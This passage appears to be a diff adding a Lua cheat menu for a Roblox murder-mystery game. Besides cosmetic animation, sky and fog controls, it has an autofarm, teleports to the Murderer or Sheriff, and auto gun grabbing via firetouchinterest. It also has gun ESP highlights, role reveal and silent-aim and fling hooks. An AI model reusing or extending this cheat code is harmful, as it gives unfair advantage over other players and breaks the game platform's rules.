+Tabs.AutoFarm:AddToggle(\"CoinFarmToggle\", { Title = \"Enable Coin Farm\", Default = false, Callback = function(v)\
+    toggleCoinFarm(v)\
+    saveSettings()\
+end })\
+Tabs.AutoFarm:AddSlider(\"CoinFarmSpeed\", { Title = \"Farm Speed\", Min=0.5, Max=3, Default=1, Rounding=1, Callback = function(v)\
+    _G.CoinFarmSpeed = v\
+    saveSettings()\
+end })\
+Tabs.AutoFarm:AddDropdown(\"CoinType\", { Title = \"Coin Type\", Values = {\"Coin\", \"BeachBall\", \"Coin and BeachBall\"}, Default = \"Coin and BeachBall\", Callback = function(v)\
+    _G.CoinType = v\
+    saveSettings()\
+end })\
+Tabs.Whitelist:AddSection(\"Whitelist\")\
+Tabs.Whitelist:AddToggle(\"WhitelistOn\", { Title = \"Enable\", Default = false, Callback = function(v)\
+    _G.WhitelistEnabled = v\
+    saveSettings()\
+end })\
+Tabs.Whitelist:AddToggle(\"WhitelistFriends\", { Title = \"Friends\", Default = false, Callback = function(v)\
+    _G.WhitelistFriends = v\
+    saveSettings()\
+end })\
+Tabs.Whitelist:AddDropdown(\"WhitelistPlayers\", { Title = \"Players\", Values = getPlayersNames(), Default = {}, Multi = true, Callback = function(v)\
+    _G.WhitelistPlayers = v\
+    saveSettings()\
+end })\
+_G.SelectedAnimation = _G.SelectedAnimation or {}\
+local function setAnimationsAndSave(idle1, idle2, walk, run, jump, climb, fall, swimIdle, swim)\
+    _G.SelectedAnimation = {\
+        idle1 = idle1, idle2 = idle2, walk = walk, run = run, jump = jump,\
+        climb = climb, fall = fall, swimIdle = swimIdle, swim = swim\
+    }\
+    local char = LocalPlayer.Character\
+    if not char then return end\
+    local animate = char:FindFirstChild(\"Animate\")\
+    if not animate then return end\
+    if animate:FindFirstChild(\"idle\") then\
+        local idle = animate.idle\
+        if idle:FindFirstChild(\"Animation1\") then idle.Animation1.AnimationId = idle1 end\
+        if idle:FindFirstChild(\"Animation2\") then idle.Animation2.AnimationId = idle2 end\
+    end\
+    if animate:FindFirstChild(\"walk\") and animate.walk:FindFirstChild(\"WalkAnim\") then\
+        animate.walk.WalkAnim.AnimationId = walk\
+    end\
+    if animate:FindFirstChild(\"run\") and animate.run:FindFirstChild(\"RunAnim\") then\
+        animate.run.RunAnim.AnimationId = run\
+    end\
+    if animate:FindFirstChild(\"jump\") and animate.jump:FindFirstChild(\"JumpAnim\") then\
+        animate.jump.JumpAnim.AnimationId = jump\
+    end\
+    if animate:FindFirstChild(\"climb\") and animate.climb:FindFirstChild(\"ClimbAnim\") then\
+        animate.climb.ClimbAnim.AnimationId = climb\
+    end\
+    if animate:FindFirstChild(\"fall\") and animate.fall:FindFirstChild(\"FallAnim\") then\
+        animate.fall.FallAnim.AnimationId = fall\
+    end\
+    if animate:FindFirstChild(\"swimidle\") and animate.swimidle:FindFirstChild(\"SwimIdle\") then\
+        animate.swimidle.SwimIdle.AnimationId = swimIdle\
+    end\
+    if animate:FindFirstChild(\"swim\") and animate.swim:FindFirstChild(\"Swim\") then\
+        animate.swim.Swim.AnimationId = swim\
+    end\
+    local hum = char:FindFirstChildOfClass(\"Humanoid\")\
+    if hum then\
+        hum.Jump = true\
+        task.wait(0.05)\
+        hum.Jump = false\
+    end\
+end\
+local function applyStoredAnimation(character)\
+    local animate = character:FindFirstChild(\"Animate\")\
+    if not animate then return end\
+    local data = _G.SelectedAnimation\
+    if not data or not data.idle1 then return end\
+    if animate:FindFirstChild(\"idle\") then\
+        local idle = animate.idle\
+        if idle:FindFirstChild(\"Animation1\") and data.idle1 then idle.Animation1.AnimationId = data.idle1 end\
+        if idle:FindFirstChild(\"Animation2\") and data.idle2 then idle.Animation2.AnimationId = data.idle2 end\
+    end\
+    if animate:FindFirstChild(\"walk\") and animate.walk:FindFirstChild(\"WalkAnim\") and data.walk then\
+        animate.walk.WalkAnim.AnimationId = data.walk\
+    end\
+    if animate:FindFirstChild(\"run\") and animate.run:FindFirstChild(\"RunAnim\") and data.run then\
+        animate.run.RunAnim.AnimationId = data.run\
+    end\
+    if animate:FindFirstChild(\"jump\") and animate.jump:FindFirstChild(\"JumpAnim\") and data.jump then\
+        animate.jump.JumpAnim.AnimationId = data.jump\
+    end\
+    if animate:FindFirstChild(\"climb\") and animate.climb:FindFirstChild(\"ClimbAnim\") and data.climb then\
+        animate.climb.ClimbAnim.AnimationId = data.climb\
+    end\
+    if animate:FindFirstChild(\"fall\") and animate.fall:FindFirstChild(\"FallAnim\") and data.fall then\
+        animate.fall.FallAnim.AnimationId = data.fall\
+    end\
+    if animate:FindFirstChild(\"swimidle\") and animate.swimidle:FindFirstChild(\"SwimIdle\") and data.swimIdle then\
+        animate.swimidle.SwimIdle.AnimationId = data.swimIdle\
+    end\
+    if animate:FindFirstChild(\"swim\") and animate.swim:FindFirstChild(\"Swim\") and data.swim then\
+        animate.swim.Swim.AnimationId = data.swim\
+    end\
+    local hum = character:FindFirstChildOfClass(\"Humanoid\")\
+    if hum then\
+        hum.Jump = true\
+        task.wait(0.05)\
+        hum.Jump = false\
+    end\
+end\
+LocalPlayer.CharacterAdded:Connect(function(char)\
+    task.wait(0.5)\
+    applyStoredAnimation(char)\
+end)\
+if LocalPlayer.Character then\
+    task.wait(0.5)\
+    applyStoredAnimation(LocalPlayer.Character)\
+end\
+Tabs.Emotes:AddSection(\"Emotes (click to play)\")\
+local function playEmote(name)\
+    if PlayEmoteEvent then\
+        pcall(function() PlayEmoteEvent:Fire(name) end)\
+    else\
+        Notify(\"Error\", \"Emote remote not found\", \"Error\", nil, 2)\
+    end\
+end\
+Tabs.Emotes:AddButton({ Title = \"Sit\", Callback = function() playEmote(\"sit\") end })\
+Tabs.Emotes:AddButton({ Title = \"Zen\", Callback = function() playEmote(\"zen\") end })\
+Tabs.Emotes:AddButton({ Title = \"Dab\", Callback = function() playEmote(\"dab\") end })\
+Tabs.Emotes:AddButton({ Title = \"Floss\", Callback = function() playEmote(\"floss\") end })\
+Tabs.Emotes:AddButton({ Title = \"Zombie\", Callback = function() playEmote(\"zombie\") end })\
+Tabs.Emotes:AddButton({ Title = \"Headless\", Callback = function() playEmote(\"headless\") end })\
+Tabs.Emotes:AddDivider()\
+local normalSec = Tabs.Emotes:AddCollapsibleSection(\"Normal Animations\", \"lucide/activity\", true)\
+local normalAnims = {\
+    { name = \"Astronaut\", idle1 = \"891621366\", idle2 = \"891633237\", walk = \"891667138\", run = \"891636393\", jump = \"891627522\", climb = \"891609353\", fall = \"891617961\" },\
+    { name = \"Bubbly\", idle1 = \"910004836\", idle2 = \"910009958\", walk = \"910034870\", run = \"910025107\", jump = \"910016857\", climb = \"\", fall = \"910001910\", swimIdle = \"910030921\", swim = \"910028158\" },\
+    { name = \"Cartoony\", idle1 = \"742637544\", idle2 = \"742638445\", walk = \"742640026\", run = \"742638842\", jump = \"742637942\", climb = \"742636889\", fall = \"742637151\" },\
+    { name = \"Elder\", idle1 = \"845397899\", idle2 = \"845400520\", walk = \"845403856\", run = \"845386501\", jump = \"845398858\", climb = \"845392038\", fall = \"845396048\" },\
+    { name = \"Knight\", idle1 = \"657595757\", idle2 = \"657568135\", walk = \"657552124\", run = \"657564596\", jump = \"658409194\", climb = \"658360781\", fall = \"657600338\" },\
+    { name = \"Levitation\", idle1 = \"616006778\", idle2 = \"616008087\", walk = \"616013216\", run = \"616010382\", jump = \"616008936\", climb = \"616003713\", fall = \"616005863\" },\
+    { name = \"Mage\", idle1 = \"707742142\", idle2 = \"707855907\", walk = \"707897309\", run = \"707861613\", jump = \"707853694\", climb = \"707826056\", fall = \"707829716\" },\
+    { name = \"Ninja\", idle1 = \"656117400\", idle2 = \"656118341\", walk = \"656121766\", run = \"656118852\", jump = \"656117878\", climb = \"656114359\", fall = \"656115606\" },\
+    { name = \"Pirate\", idle1 = \"750781874\", idle2 = \"750782770\", walk = \"750785693\", run = \"750783738\", jump = \"750782230\", climb = \"750779899\", fall = \"750780242\" },\
+    { name = \"Robot\", idle1 = \"616088211\", idle2 = \"616089559\", walk = \"616095330\", run = \"616091570\", jump = \"616090535\", climb = \"616086039\", fall = \"616087089\" },\
+    { name = \"Stylish\", idle1 = \"616136790\", idle2 = \"616138447\", walk = \"616146177\", run = \"616140816\", jump = \"616139451\", climb = \"616133594\", fall = \"616134815\" },\
+    { name = \"SuperHero\", idle1 = \"616111295\", idle2 = \"616113536\", walk = \"616122287\", run = \"616117076\", jump = \"616115533\", climb = \"616104706\", fall = \"616108001\" },\
+    { name = \"Toy\", idle1 = \"782841498\", idle2 = \"782845736\", walk = \"782843345\", run = \"782842708\", jump = \"782847020\", climb = \"782843869\", fall = \"782846423\" },\
+    { name = \"Vampire\", idle1 = \"1083445855\", idle2 = \"1083450166\", walk = \"1083473930\", run = \"1083462077\", jump = \"1083455352\", climb = \"1083439238\", fall = \"1083443587\" },\
+    { name = \"Werewolf\", idle1 = \"1083195517\", idle2 = \"1083214717\", walk = \"1083178339\", run = \"1083216690\", jump = \"1083218792\", climb = \"1083182000\", fall = \"1083189019\" },\
+    { name = \"Zombie\", idle1 = \"616158929\", idle2 = \"616160636\", walk = \"616168032\", run = \"616163682\", jump = \"616161997\", climb = \"616156119\", fall = \"616157476\" },\
+}\
+for _, anim in ipairs(normalAnims) do\
+    normalSec:AddButton({ Title = anim.name, Callback = function()\
+        setAnimationsAndSave(\
+            \"http://www.roblox.com/asset/?id=\"..anim.idle1,\
+            \"http://www.roblox.com/asset/?id=\"..(anim.idle2 or anim.idle1),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.walk or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.run or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.jump or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.climb or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.fall or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.swimIdle or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.swim or \"\")\
+        )\
+        Notify(\"Animation\", \"Changed to \"..anim.name, \"Success\", nil, 2)\
+    end })\
+end\
+local specialSec = Tabs.Emotes:AddCollapsibleSection(\"Special Animations\", \"lucide/star\", true)\
+local specialAnims = {\
+    { name = \"Patrol\", idle1 = \"1149612882\", idle2 = \"1150842221\", walk = \"1151231493\", run = \"1150967949\", jump = \"1148811837\", climb = \"1148811837\", fall = \"1148863382\" },\
+    { name = \"Confident\", idle1 = \"1069977950\", idle2 = \"1069987858\", walk = \"1070017263\", run = \"1070001516\", jump = \"1069984524\", climb = \"1069946257\", fall = \"1069973677\" },\
+    { name = \"Popstar\", idle1 = \"1212900985\", idle2 = \"1150842221\", walk = \"1212980338\", run = \"1212980348\", jump = \"1212954642\", climb = \"1213044953\", fall = \"1212900995\" },\
+    { name = \"Cowboy\", idle1 = \"1014390418\", idle2 = \"1014398616\", walk = \"1014421541\", run = \"1014401683\", jump = \"1014394726\", climb = \"1014380606\", fall = \"1014384571\" },\
+    { name = \"Ghost\", idle1 = \"616006778\", idle2 = \"616008087\", walk = \"616013216\", run = \"616013216\", jump = \"616008936\", climb = \"\", fall = \"616005863\", swimIdle = \"616012453\", swim = \"616011509\" },\
+    { name = \"Sneaky\", idle1 = \"1132473842\", idle2 = \"1132477671\", walk = \"1132510133\", run = \"1132494274\", jump = \"1132489853\", climb = \"1132461372\", fall = \"1132469004\" },\
+    { name = \"Princess\", idle1 = \"941003647\", idle2 = \"941013098\", walk = \"941028902\", run = \"941015281\", jump = \"941008832\", climb = \"940996062\", fall = \"941000007\" },\
+}\
+for _, anim in ipairs(specialAnims) do\
+    specialSec:AddButton({ Title = anim.name, Callback = function()\
+        setAnimationsAndSave(\
+            \"http://www.roblox.com/asset/?id=\"..anim.idle1,\
+            \"http://www.roblox.com/asset/?id=\"..(anim.idle2 or anim.idle1),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.walk or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.run or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.jump or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.climb or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.fall or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.swimIdle or \"\"),\
+            \"http://www.roblox.com/asset/?id=\"..(anim.swim or \"\")\
+        )\
+        Notify(\"Animation\", \"Changed to \"..anim.name, \"Success\", nil, 2)\
+    end })\
+end\
+local otherSec = Tabs.Emotes:AddCollapsibleSection(\"Other\", \"lucide/more-horizontal\", true)\
+otherSec:AddButton({ Title = \"None (Clear)\", Callback = function()\
+    setAnimationsAndSave(\"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\")\
+    Notify(\"Animation\", \"Cleared all animations\", \"Info\", nil, 2)\
+end })\
+otherSec:AddButton({ Title = \"Anthro (Default)\", Callback = function()\
+    setAnimationsAndSave(\
+        \"http://www.roblox.com/asset/?id=2510196951\",\
+        \"http://www.roblox.com/asset/?id=2510197257\",\
+        \"http://www.roblox.com/asset/?id=2510202577\",\
+        \"http://www.roblox.com/asset/?id=2510198475\",\
+        \"http://www.roblox.com/asset/?id=2510197830\",\
+        \"http://www.roblox.com/asset/?id=2510192778\",\
+        \"http://www.roblox.com/asset/?id=2510195892\",\
+        \"\",\
+        \"\"\
+    )\
+    Notify(\"Animation\", \"Set to Anthro default\", \"Success\", nil, 2)\
+end})\
+Tabs.Teleport:AddSection(\"Teleports\")\
+Tabs.Teleport:AddButton({ Title = \"Teleport to Map Spawn\", Callback = teleportToSpawn })\
+Tabs.Teleport:AddButton({ Title = \"Teleport to Murderer\", Callback = function()\
+    local murd = getTargetByRole(\"Murderer\")\
+    if murd and murd.Character and murd.Character:FindFirstChild(\"HumanoidRootPart\") then\
+        LocalPlayer.Character.HumanoidRootPart.CFrame = murd.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)\
+    end\
+end })\
+Tabs.Teleport:AddButton({ Title = \"Teleport to Sheriff\", Callback = function()\
+    local sher = getTargetByRole(\"Sheriff\")\
+    if sher and sher.Character and sher.Character:FindFirstChild(\"HumanoidRootPart\") then\
+        LocalPlayer.Character.HumanoidRootPart.CFrame = sher.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)\
+    end\
+end })\
+local grabSec = Tabs.Misc:AddCollapsibleSection(\"Auto Grab Gun\", \"lucide/hand\", true)\
+grabSec:AddToggle(\"AutoGrab\", { Title = \"Auto Grab Gun\", Default = false, Callback = function(v)\
+    _G.AutoGrabEnabled = v\
+    saveSettings()\
+end })\
+grabSec:AddKeybind(\"GrabKey\", { Title = \"Manual Grab\", Default = \"G\", Callback = function()\
+    local found = false\
+    for gd,_ in pairs(gunDropCache) do\
+        if gd and gd.Parent then found = true break end\
+    end\
+    if not found then Notify(\"Error\", \"No dropped gun!\", \"Error\", nil, 2) return end\
+    local char = LocalPlayer.Character\
+    local root = char and char:FindFirstChild(\"HumanoidRootPart\")\
+    if root then\
+        for gd,_ in pairs(gunDropCache) do\
+            if gd and gd.Parent then\
+                gd:PivotTo(root.CFrame)\
+                local ti = gd:FindFirstChild(\"TouchInterest\", true) or gd:FindFirstChildWhichIsA(\"TouchTransmitter\", true)\
+                if ti then\
+                    firetouchinterest(root, gd, 0)\
+                    task.wait()\
+                    firetouchinterest(root, gd, 1)\
+                end\
+                break\
+            end\
+        end\
+    end\
+end })\
+Tabs.Misc:AddDivider()\
+local prankSec = Tabs.Misc:AddCollapsibleSection(\"Prank Bomb Jump Helper\", \"lucide/party-popper\", true)\
+prankSec:AddToggle(\"PrankBombToggle\", { Title = \"Enable\", Default = false, Callback = onPrankBombToggle })\
+prankSec:AddKeybind(\"PrankBombKeybind\", { Title = \"Placement Key\", Default = \"B\", Callback = function(key)\
+    _G.PrankBombKey = key\
+    togglePrankBombKeybind(key)\
+    saveSettings()\
+end })\
+Tabs.Misc:AddDivider()\
+local notifSec = Tabs.Misc:AddCollapsibleSection(\"Notifications\", \"lucide/bell\", true)\
+notifSec:AddToggle(\"SayRole\", { Title = \"Show role on round start\", Default = false, Callback = function(v)\
+    _G.SayRoleEnabled = v\
+    saveSettings()\
+end })\
+notifSec:AddToggle(\"RoundTimer\", { Title = \"Round Timer (MM2)\", Default = false, Callback = function(v)\
+    toggleRoundTimer(v)\
+    saveSettings()\
+end })\
+Tabs.Misc:AddDivider()\
+local afkSec = Tabs.Misc:AddCollapsibleSection(\"Anti-AFK\", \"lucide/clock\", true)\
+afkSec:AddToggle(\"AntiAfk\", { Title = \"Anti AFK\", Default = true, Callback = function(v)\
+    _G.AntiAfkEnabled = v\
+    toggleAntiAfk(v)\
+    saveSettings()\
+end })\
+Tabs.Misc:AddDivider()\
+local utilsSec = Tabs.Misc:AddCollapsibleSection(\"Utilities\", \"lucide/tool\", true)\
+utilsSec:AddButton({ Title = \"Rejoin\", Callback = rejoin })\
+utilsSec:AddButton({ Title = \"Respawn\", Callback = respawn })\
+local atmSec = Tabs.Atmosphere:AddCollapsibleSection(\"Sky Presets\", \"lucide/cloud-sun\", true)\
+local currentSkyToggle = nil\
+local function clearSky()\
+    for _, v in ipairs(Lighting:GetChildren()) do\
+        if v:IsA(\"Sky\") then v:Destroy() end\
+    end\
+end\
+local function setSkybox(texture)\
+    clearSky()\
+    local sky = Instance.new(\"Sky\")\
+    sky.Parent = Lighting\
+    sky.CelestialBodiesShown = false\
+    sky.SkyboxBk = texture\
+    sky.SkyboxDn = texture\
+    sky.SkyboxFt = texture\
+    sky.SkyboxLf = texture\
+    sky.SkyboxRt = texture\
+    sky.SkyboxUp = texture\
+end\
+local function createSkyToggle(name, texture)\
+    local toggle = atmSec:AddToggle(name..\"SkyToggle\", { Title = name, Default = false })\
+    toggle:OnChanged(function(v)\
+        if v then\
+            if currentSkyToggle and currentSkyToggle ~= toggle then\
+                currentSkyToggle:SetValue(false)\
+            end\
+            currentSkyToggle = toggle\
+            setSkybox(texture)\
+            Notify(\"Sky\", name .. \" applied\", \"Success\", nil, 2)\
+        else\
+            if currentSkyToggle == toggle then\
+                clearSky()\
+                currentSkyToggle = nil\
+                Notify(\"Sky\", \"Sky restored to default\", \"Info\", nil, 2)\
+            end\
+        end\
+    end)\
+    return toggle\
+end\
+createSkyToggle(\"Full Night\", \"http://www.roblox.com/asset/?id=17055447520\")\
+createSkyToggle(\"Black Hole\", \"http://www.roblox.com/asset/?id=17108753749\")\
+createSkyToggle(\"Neptune\", \"http://www.roblox.com/asset/?id=17108745046\")\
+createSkyToggle(\"Lofy Sky\", \"http://www.roblox.com/asset/?id=17108732394\")\
+createSkyToggle(\"Aurora Boreal\", \"http://www.roblox.com/asset/?id=17108721907\")\
+Tabs.Atmosphere:AddDivider()\
+local rtxSec = Tabs.Atmosphere:AddCollapsibleSection(\"RTX Shaders\", \"lucide/sparkles\", true)\
+local rtxToggle = rtxSec:AddToggle(\"RTXShaders\", { Title = \"RTX Shaders\", Default = false })\
+rtxToggle:OnChanged(function(v)\
+    _G.RTXShaders = v\
+    if v then\
+        pcall(function()\
+            local bloom = Instance.new(\"BloomEffect\", Lighting)\
+            bloom.Name = \"RTX_Bloom\"\
+            bloom.Intensity = 0.1\
+            bloom.Size = 100\
+            local cc = Instance.new(\"ColorCorrectionEffect\", Lighting)\
+            cc.Name = \"RTX_CC\"\
+            cc.Saturation = 0.05\
+            cc.TintColor = Color3.fromRGB(255, 224, 219)\
+            local sun = Instance.new(\"SunRaysEffect\", Lighting)\
+            sun.Name = \"RTX_SunRays\"\
+            sun.Intensity = 0.05\
+            Lighting.Brightness = 2.14\
+            Lighting.ColorShift_Bottom = Color3.fromRGB(11,0,20)\
+            Lighting.ColorShift_Top = Color3.fromRGB(240,127,14)\
+            Lighting.OutdoorAmbient = Color3.fromRGB(34,0,49)\
+            Lighting.ClockTime = 6.7\
+        end)\
+        Notify(\"RTX Shaders\", \"Enabled\", \"Success\", nil, 3)\
+    else\
+        for _, child in ipairs(Lighting:GetChildren()) do\
+            if child.Name:find(\"RTX\") then\
+                child:Destroy()\
+            end\
+        end\
+        Lighting.Brightness = 2\
+        Lighting.ColorShift_Bottom = Color3.new(0,0,0)\
+        Lighting.ColorShift_Top = Color3.new(0,0,0)\
+        Lighting.OutdoorAmbient = Color3.fromRGB(157,157,157)\
+        Lighting.ClockTime = 14\
+        Notify(\"RTX Shaders\", \"Disabled\", \"Info\", nil, 2)\
+    end\
+end)\
+Tabs.Atmosphere:AddDivider()\
+local envSec = Tabs.Atmosphere:AddCollapsibleSection(\"Environment Controls\", \"lucide/sun\", true)\
+local originalClockTime = Lighting.ClockTime\
+local originalFogStart = Lighting.FogStart\
+local originalFogEnd = Lighting.FogEnd\
+local originalFogColor = Lighting.FogColor\
+local fogEnabled = false\
+local fogDensity = 50\
+local fogColor = Color3.fromRGB(255,255,255)\
+local function applyFog()\
+    if fogEnabled then\
+        Lighting.FogStart = 0\
+        Lighting.FogEnd = 1000 - (fogDensity * 10)  \
+        Lighting.FogColor = fogColor\
+    else\
+        Lighting.FogStart = originalFogStart\
+        Lighting.FogEnd = originalFogEnd\
+        Lighting.FogColor = originalFogColor\
+    end\
+end\
+envSec:AddSlider(\"TimeOfDaySlider\", {\
+    Title = \"Time of Day\",\
+    Min = 0,\
+    Max = 24,\
+    Default = Lighting.ClockTime,\
+    Rounding = 0.5,\
+    Callback = function(v)\
+        Lighting.ClockTime = v\
+    end\
+})\
+envSec:AddToggle(\"FogToggle\", {\
+    Title = \"Enable Fog\",\
+    Default = false,\
+    Callback = function(v)\
+        fogEnabled = v\
+        applyFog()\
+        Notify(\"Fog\", fogEnabled and \"Enabled\" or \"Disabled\", \"Info\", nil, 2)\
+    end\
+})\
+envSec:AddSlider(\"FogDensitySlider\", {\
+    Title = \"Fog Density\",\
+    Min = 0,\
+    Max = 100,\
+    Default = 50,\
+    Rounding = 0,\
+    Callback = function(v)\
+        fogDensity = v\
+        if fogEnabled then\
+            applyFog()\
+            Notify(\"Fog\", \"Density: \" .. v, \"Info\", nil, 1)\
+        end\
+    end\
+})\
+envSec:AddDropdown(\"FogColorDropdown\", {\
+    Title = \"Fog Color\",\
+    Values = {\"White\",\"Gray\",\"Black\",\"Blue\",\"Red\",\"Green\",\"Purple\",\"Orange\"},\
+    Multi = false,\
+    Default = \"White\",\
+    Callback = function(v)\
+        local colorMap = {\
+            White  = Color3.fromRGB(255,255,255),\
+            Gray   = Color3.fromRGB(128,128,128),\
+            Black  = Color3.fromRGB(0,0,0),\
+            Blue   = Color3.fromRGB(100,150,255),\
+            Red    = Color3.fromRGB(255,80,80),\
+            Green  = Color3.fromRGB(80,255,80),\
+            Purple = Color3.fromRGB(200,100,255),\
+            Orange = Color3.fromRGB(255,180,50)\
+        }\
+        fogColor = colorMap[v] or Color3.fromRGB(255,255,255)\
+        if fogEnabled then\
+            applyFog()\
+            Notify(\"Fog\", \"Color: \" .. v, \"Info\", nil, 1)\
+        end\
+    end\
+})\
+envSec:AddButton({\
+    Title = \"Reset Environment\",\
+    Callback = function()\
+        Lighting.ClockTime = originalClockTime\
+        Lighting.FogStart = originalFogStart\
+        Lighting.FogEnd = originalFogEnd\
+        Lighting.FogColor = originalFogColor\
+        fogEnabled = false\
+        fogDensity = 50\
+        fogColor = Color3.fromRGB(255,255,255)\
+        pcall(function()\
+            Options.TimeOfDaySlider:SetValue(originalClockTime)\
+            Options.FogToggle:SetValue(false)\
+            Options.FogDensitySlider:SetValue(50)\
+            Options.FogColorDropdown:SetValue(\"White\")\
+        end)\
+        Notify(\"Environment\", \"Reset to defaults\", \"Info\", nil, 2)\
+    end\
+})\
+Tabs.Settings:AddSection(\"Theme\")\
+Tabs.Settings:AddDropdown(\"ThemeSelect\", { Title = \"UI Theme\", Values = themes, Default = themes[1], Callback = function(v)\
+    _G.Theme = v\
+    pcall(function() Fluent:SetTheme(v) end)\
+    saveSettings()\
+end })\
+if _G.ExtremeFlingEnabled then\
+    pcall(function()\
+        Options.ExtremeFlingToggle:SetValue(true)\
+        toggleExtremeFling(true)\
+    end)\
+end\
+Tabs.Settings:AddDivider()\
+local backgroundIDs = {\
+    [\"Blue (Ryo)\"] = \"rbxassetid://110300998910160\",\
+    [\"Red (Kita)\"] = \"rbxassetid://125644682328750\",\
+    [\"Pink (Bocchi)\"] = \"rbxassetid://100823211487117\",\
+    [\"Yellow (Nijika)\"] = \"rbxassetid://90908656139712\",\
+    [\"Crimson\"] = \"rbxassetid://132324914333495\",\
+    [\"Gold\"] = \"rbxassetid://107795771598485\",\
+    [\"AMOLED\"] = \"rbxassetid://134736124666311\",\
+}\
+local bgNames = {}\
+for k in pairs(backgroundIDs) do table.insert(bgNames, k) end\
+table.sort(bgNames)\
+Tabs.Settings:AddDropdown(\"BackgroundSelect\", {\
+    Title = \"Background Image\",\
+    Values = bgNames,\
+    Default = bgNames[1],\
+    Callback = function(v)\
+        local id = backgroundIDs[v]\
+        if id then\
+            pcall(function()\
+                local acrylic = Window.AcrylicPaint\
+                if acrylic and acrylic.Frame then\
+                    local bg = acrylic.Frame:FindFirstChild(\"__ThemeBG\")\
+                    if bg then\
+                        bg.Image = id\
+                    else\
+                        bg = Instance.new(\"ImageLabel\")\
+                        bg.Name = \"__ThemeBG\"\
+                        bg.Size = UDim2.fromScale(1,1)\
+                        bg.BackgroundTransparency = 1\
+                        bg.ScaleType = Enum.ScaleType.Crop\
+                        bg.ZIndex = 0\
+                        bg.Image = id\
+                        bg.Parent = acrylic.Frame\
+                    end\
+                end\
+            end)\
+        end\
+    end\
+})\
+Tabs.Settings:AddSection(\"Config\")\
+Tabs.Settings:AddButton({ Title = \"Save Settings\", Callback = function()\
+    saveSettings()\
+    Notify(\"Saved\", \"\", \"Success\", nil, 2)\
+end })\
+Tabs.Settings:AddButton({ Title = \"Load Settings\", Callback = function()\
+    if loadSettings() then\
+        Notify(\"Loaded\", \"\", \"Success\", nil, 2)\
+    else\
+        Notify(\"No save file\", \"\", \"Error\", nil, 2)\
+    end\
+end })\
+UserInputService.InputBegan:Connect(function(input, gp)\
+    if gp then return end\
+    if input.KeyCode == Enum.KeyCode.Space then spaceHeld = true end\
+    if _G.FastThrowEnabled and input.KeyCode == Enum.KeyCode[_G.FastThrowKey] then\
+        throwKnife()\
+    end\
+    if _G.KnifeSilentAimEnabled and input.KeyCode == Enum.KeyCode[_G.KnifeSilentAimKey] then\
+        knifeSilentAim()\
+    end\
+end)\
+UserInputService.InputEnded:Connect(function(input)\
+    if input.KeyCode == Enum.KeyCode.Space then spaceHeld = false end\
+end)\
+RunService.PostSimulation:Connect(function()\
+    if not spaceHeld then return end\
+    local char = LocalPlayer.Character\
+    local hrp = char and char:FindFirstChild(\"HumanoidRootPart\")\
+    local hum = char and char:FindFirstChildOfClass(\"Humanoid\")\
+    if not hrp or not hum then return end\
+    if hum:GetState() == Enum.HumanoidStateType.Freefall and (os.clock() - lastJumpTime) > 0.15 then\
+    end\
+end)\
+LocalPlayer.CharacterAdded:Connect(function(char)\
+    local hum = char:WaitForChild(\"Humanoid\")\
+    task.wait(0.5)\
+    updateMovement()\
+    hum.Died:Connect(function()\
+        isDead = true\
+    end)\
+end)\
+LocalPlayer.CharacterRemoving:Connect(clearESP)\
+if FadeEvent then\
+    FadeEvent.OnClientEvent:Connect(function(data)\
+        if type(data) == \"table\" then\
+            currentRoles = {}\
+            savedPlayerData = data\
+            local myRole = \"Unknown\"\
+            for name, d in pairs(data) do\
+                if type(d) == \"table\" and d.Role then\
+                    currentRoles[name] = d.Role\
+                    if name == LocalPlayer.Name then myRole = d.Role end\
+                end\
+            end\
+            inRound = true\
+            isDead = false\
+            if _G.SayRoleEnabled then\
+                Notify(\"Round Started\", \"Your role: \"..myRole, \"Info\", nil, 5)\
+            end\
+        end\
+    end)\
+end\
+if RoundEndFadeEvent then\
+    RoundEndFadeEvent.OnClientEvent:Connect(function()\
+        clearESP()\
+        table.clear(gunDropCache)\
+        inRound = false\
+        isDead = false\
+    end)\
+end\
+local function regGun(obj)\
+    if obj.Name == \"GunDrop\" then\
+        gunDropCache[obj] = true\
+    end\
+end\
+for _,v in pairs(workspace:GetDescendants()) do\
+    regGun(v)\
+end\
+workspace.DescendantAdded:Connect(regGun)\
+workspace.DescendantRemoving:Connect(function(obj)\
+    if gunDropCache[obj] then\
+        gunDropCache[obj] = nil\
+    end\
+end)\
+task.spawn(function()\
+    while true do\
+        pcall(function()\
+            scanRoles()\
+            updateMovement()\
+            if _G.EspEnabled then\
+                for _, pl in ipairs(Players:GetPlayers()) do\
+                    updateESP(pl)\
+                end\
+            end\
+            local mr = getMyRole()\
+            for gd,_ in pairs(gunDropCache) do\
+                if gd and gd.Parent then\
+                    if _G.AutoGrabEnabled and mr ~= \"Murderer\" and mr ~= \"Sheriff\" then\
+                        local char = LocalPlayer.Character\
+                        local root = char and char:FindFirstChild(\"HumanoidRootPart\")\
+                        if root then\
+                            gd:PivotTo(root.CFrame)\
+                            local ti = gd:FindFirstChild(\"TouchInterest\", true) or gd:FindFirstChildWhichIsA(\"TouchTransmitter\", true)\
+                            if ti then\
+                                firetouchinterest(root, gd, 0)\
+                                task.wait()\
+                                firetouchinterest(root, gd, 1)\
+                            end\
+                        end\
+                    end\
+                    if _G.GunEspEnabled then\
+                        local hl = gd:FindFirstChild(\"GunDropHighlight\") or Instance.new(\"Highlight\", gd)\
+                        hl.Name = \"GunDropHighlight\"\
+                        hl.FillColor = _G.GunFill\
+                        hl.FillTransparency = _G.GunFillTrans\
+                        hl.OutlineColor = _G.GunOutline\
+                        hl.OutlineTransparency = _G.GunOutlineTrans\
+                    else\
+                        local hl = gd:FindFirstChild(\"GunDropHighlight\")\
